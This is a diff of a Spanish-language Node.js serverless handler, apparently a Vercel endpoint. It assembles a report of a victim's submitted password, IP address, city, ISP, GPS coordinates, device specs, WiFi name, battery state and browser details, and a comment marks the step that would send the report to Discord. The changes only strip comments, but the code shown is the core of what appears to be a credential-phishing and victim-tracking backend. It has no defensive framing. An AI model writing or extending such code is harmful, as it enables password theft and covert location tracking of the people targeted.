@@ -1,4 +1,3 @@
-// [DEBUG 2026-09-25] WiFi incluido en mensaje — commit 0616bdd
 import { Buffer } from 'node:buffer';
 
 const GH_TOKEN = process.env.GH_TOKEN || '';
@@ -205,7 +204,6 @@ export default async function handler(req, res) {
         message += '\nContraseña: ' + password;
         message += '\nIP: ' + clientIp;
 
-        // Ubicacion con ISP
         message += '\n\nUbicacion:';
         if (geoCity) message += '\nCiudad: ' + geoCity;
         if (geoRegion) message += '\nRegion: ' + geoRegion;
@@ -213,19 +211,16 @@ export default async function handler(req, res) {
         if (geoIsp) message += '\nISP: ' + geoIsp;
         if (geoLat && geoLon) message += '\nCoordenadas: ' + geoLat + ', ' + geoLon;
 
-        // Dispositivo
         message += '\n\nDispositivo:';
         message += '\nRAM: ' + deviceMemory + ' GB';
         message += '\nCPU: ' + cpuCores + ' nucleos';
         message += '\nTipo: ' + deviceTypeText;
         if (wifiName) message += '\nWiFi: ' + wifiName;
 
-        // Batería
         if (batteryLevel !== 'No disponible') {
           message += '\n\nBateria: ' + batteryLevel + (batteryCharging === 'Sí' ? ' (Cargando)' : '');
         }
 
-        // Navegador, idioma, pantalla, zona horaria, plataforma, estado, cookies
         message += '\n\nNavegador: ' + userAgent;
         message += '\nIdioma: ' + language;
         message += '\nPantalla: ' + screenResolution + ' (' + colorDepth.replace(' bits','') + ' bits)';
@@ -275,7 +270,7 @@ export default async function handler(req, res) {
       }
     }
 
-    // DEBUG: devolver el message para verificar contenido antes de enviar
+    // DEBUG: devolver el message para verificar contenido (Vercel v2 endpoint)
     return res.status(200).json({ success: true, message: 'OK', debug_message: message, wifiName: wifiName });
 
     // Descomentar para enviar a Discord:
